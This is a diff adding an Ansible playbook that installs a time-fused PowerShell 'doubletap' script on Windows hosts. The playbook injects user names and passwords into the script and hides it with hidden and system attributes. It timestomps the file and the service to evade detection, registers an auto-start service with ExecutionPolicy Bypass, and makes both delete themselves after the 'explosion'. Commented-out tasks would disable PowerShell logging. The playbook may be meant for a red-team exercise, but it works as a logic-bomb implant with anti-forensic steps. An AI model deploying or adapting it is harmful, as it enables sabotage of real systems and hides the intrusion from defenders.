@@ -1,0 +1,113 @@
+---
+#- name: Define variables for paths and filenames
+#  set_fact:
+#    doubletap_ps1_service_script_dest: "C:\\Windows\\Temp\\firewall_script2.ps1"
+#    doubletap_ps1_service_service_name: "DoubleTapScript"
+#    doubletap_ps1_service_service_display_name: "DoubleTap Script"
+
+#- name: Disable PowerShell logging by modifying the registry
+#  win_registry:
+#    path: "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell"
+#    name: "EnableTranscripting"
+#    type: dword
+#    data: "0"
+#    state: present
+
+- name: Ensure destination directory exists on Windows
+  ansible.windows.win_file:
+    path: "{{ doubletap_ps1_service_script_dest | win_dirname }}"
+    state: directory
+    recurse: yes
+
+- name: Copy PowerShell script to target
+  win_copy:
+    src: "files/doubletap.ps1"
+    dest: "{{ doubletap_ps1_service_script_dest }}"
+
+# Need to do this as separate tasks
+- name: Update users list in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_service_script_dest }}"
+    regexp: '^\$users\s*=\s*.*'
+    line: '$users = "{{ doubletap_users }}"'
+    backrefs: yes
+
+- name: Update user password in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_service_script_dest }}"
+    regexp: '^\$users_pwd\s*=\s*.*'
+    line: '$users_pwd = "{{ doubletap_users_pwd }}"'
+    backrefs: yes
+
+- name: Update fuse_date in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_service_script_dest }}"
+    regexp: '^\$fuse_date\s*=\s*.*'
+    line: '$fuse_date = "{{ doubletap_fuse_date }}" # In format YYYY-MM-DD in America/New_York timezone'
+    backrefs: yes
+
+- name: Update fuse_time in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_service_script_dest }}"
+    regexp: '^\$fuse_time\s*=\s*.*'
+    line: '$fuse_time = "{{ doubletap_fuse_time }}" # In format HH:MM:SS, using 24h time in America/New_York timezone'
+    backrefs: yes
+
+- name: Update fuse_armed in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_service_script_dest }}"
+    regexp: '^\$fuse_armed\s*=\s*.*'
+    line: '$fuse_armed = ${{ doubletap_fuse_armed }} # DO NOT SET THIS TO TRUE UNLESS YOU WANT TO EXPLODE'
+    backrefs: yes
+
+- name: Update log_location in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_service_script_dest }}"
+    regexp: '^\$log_location\s*=\s*.*'
+    line: '$log_location = {{ doubletap_ps1_service_log_path }} # Set to $null for no output (and comment out line 14)'
+    backrefs: yes
+    
+- name: Modify PowerShell script to self-delete service after execution
+  win_lineinfile:
+    path: "{{ doubletap_ps1_service_script_dest }}"
+    line: 'Stop-Service -Name "{{ doubletap_ps1_service_service_name }}" -Force; Remove-Service -Name "{{ doubletap_ps1_service_service_name }}"'
+    insertafter: "# Cleanup after explosion"
+
+- name: Add script deletion at the end of the PowerShell script
+  win_lineinfile:
+    path: "{{ doubletap_ps1_service_script_dest }}"
+    line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
+    insertafter: 'Log " My work here is done"'
+
+- name: Apply hidden and system attributes to the PowerShell script
+  win_shell: |
+    attrib +h +s "{{ doubletap_ps1_service_script_dest }}"
+
+- name: Timestomp script to evade detection
+  win_shell: |
+    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+    (Get-Item "{{ doubletap_ps1_service_script_dest }}").CreationTime = $time
+    (Get-Item "{{ doubletap_ps1_service_script_dest }}").LastWriteTime = $time
+    (Get-Item "{{ doubletap_ps1_service_script_dest }}").LastAccessTime = $time
+  args:
+    executable: "powershell.exe"
+
+- name: Create Windows Service to Run PowerShell Script
+  win_service:
+    name: "{{ doubletap_ps1_service_service_name }}"
+    display_name: "{{ doubletap_ps1_service_service_display_name }}"
+    start_mode: auto
+    path: >-
+      "powershell.exe -ExecutionPolicy Bypass -File {{ doubletap_ps1_service_script_dest }}""
+    state: "started"
+
+- name: Timestomp the Service to evade detection
+  win_shell: |
+    $service = Get-WmiObject -Class Win32_Service -Filter "Name='{{ doubletap_ps1_service_service_name }}'"
+    if ($service) {
+        $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+        $service.CreationDate = $time
+        $service.StartMode = "Manual" # Optionally change the service start mode
+    }
+  args:
+    executable: "powershell.exe"
